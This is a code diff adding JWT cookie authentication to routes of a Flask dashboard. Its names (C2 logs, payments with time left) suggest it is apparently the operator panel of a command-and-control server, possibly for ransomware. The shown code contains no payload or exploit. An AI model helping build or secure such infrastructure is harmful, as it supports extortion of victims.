@@ -1,10 +1,11 @@
-from flask import Blueprint, render_template
+from flask import Blueprint, render_template, request, redirect
+import jwt
 import sqlite3
 from datetime import datetime, timezone
 import json
 import os
-from Extensions import limiter
-from C2_Variables import DB_PATH, seconds_left, dashboard_log_json, c2_log_json
+from Extensions import limiter, check_token, check_token_log
+from C2_Variables import DB_PATH, seconds_left, dashboard_log_json, c2_log_json, jwt_key_dashboard
 
 dashboard_bp = Blueprint('dashboard', __name__)
 
@@ -12,13 +13,17 @@ dashboard_bp = Blueprint('dashboard', __name__)
 
 @dashboard_bp.route('/dashboard/home')
 def dashboard_home():
-    return render_template('Dashboard_Home.html')
+    token = request.cookies.get('token')
+    web_page = 'Dashboard_Home.html'
+    return check_token(token, web_page)
 
 ####################################################################################################################
 
 @dashboard_bp.route('/dashboard/log')
 def dashboard_log():
-    return render_template('Dashboard_Log.html')
+    token = request.cookies.get('token')
+    web_page = 'Dashboard_Log.html'
+    return check_token(token, web_page)
 
 ####################################################################################################################
 
@@ -42,7 +47,10 @@ def dashboard_log_dashboard():
     except Exception as e:
         pretty_json = f"Error loading json: {e}"
 
-    return render_template('Dashboard_Log.html', log_data=pretty_json)
+    token = request.cookies.get('token')
+    web_page = 'Dashboard_Log.html'
+    log_data = pretty_json
+    return check_token_log(token, web_page, log_data)
 
 ####################################################################################################################
 
@@ -66,7 +74,10 @@ def dashboard_log_c2():
     except Exception as e:
         pretty_json = f"Error loading json: {e}"
 
-    return render_template('Dashboard_Log.html', log_data=pretty_json)
+    token = request.cookies.get('token')
+    web_page = 'Dashboard_Log.html'
+    log_data = pretty_json
+    return check_token_log(token, web_page, log_data)
 
 ####################################################################################################################
 
@@ -99,6 +110,9 @@ def dashboard_log_payments():
             "time_left": time_left
         })
 
-    return render_template('Dashboard_Payments.html', log_data=payments)
+    token = request.cookies.get('token')
+    web_page = 'Dashboard_Payments.html'
+    log_data = payments
+    return check_token_log(token, web_page, log_data)
 
 ####################################################################################################################
